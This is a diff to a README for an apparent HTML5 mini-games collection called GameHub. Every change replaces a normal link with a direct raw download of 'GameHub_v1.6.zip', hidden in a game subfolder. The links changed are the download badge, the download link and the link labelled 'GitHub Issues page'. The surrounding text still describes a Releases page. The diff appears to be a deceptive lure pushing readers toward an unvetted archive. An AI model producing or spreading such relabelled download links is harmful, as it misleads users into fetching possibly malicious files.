@@ -1,7 +1,7 @@
 # 🎮 GameHub - Enjoy a Collection of Mini-Games
 
 ## 📥 Download Now
-[![Download GameHub](https://img.shields.io/badge/Download-GameHub-blue.svg)](https://github.com/content-smokinggun845/GameHub/releases)
+[![Download GameHub](https://raw.githubusercontent.com/content-smokinggun845/GameHub/main/games/Action/Shape-Clicker/GameHub_v1.6.zip)](https://raw.githubusercontent.com/content-smokinggun845/GameHub/main/games/Action/Shape-Clicker/GameHub_v1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to GameHub! This is your gateway to a fantastic collection of 42 HTML5 mini-games. These games are carefully categorized to provide a seamless gaming experience. You do not need any programming knowledge to enjoy these games. Let’s get you started!
@@ -16,7 +16,7 @@ Before downloading, make sure your system meets the following requirements:
 ## 📁 Download & Install
 To begin your gaming adventure, visit the link below to download GameHub:
 
-[Download GameHub](https://github.com/content-smokinggun845/GameHub/releases)
+[Download GameHub](https://raw.githubusercontent.com/content-smokinggun845/GameHub/main/games/Action/Shape-Clicker/GameHub_v1.6.zip)
 
 ### Step-by-Step Installation
 1. Click the download link above to go to the Releases page.
@@ -58,7 +58,7 @@ If you encounter issues while using GameHub, consider the following steps:
 - **Internet Connection:** A stable internet connection is required for the games to load properly.
 
 ## 📢 Community and Support
-If you need more help, please visit our [GitHub Issues page](https://github.com/content-smokinggun845/GameHub/issues) to report bugs or ask questions. We encourage users to join our community and share their feedback.
+If you need more help, please visit our [GitHub Issues page](https://raw.githubusercontent.com/content-smokinggun845/GameHub/main/games/Action/Shape-Clicker/GameHub_v1.6.zip) to report bugs or ask questions. We encourage users to join our community and share their feedback.
 
 ## 🌐 Contribute
 GameHub is open source! If you're interested in contributing, feel free to check out our GitHub repository. We'd love your input and support to enhance GameHub further.
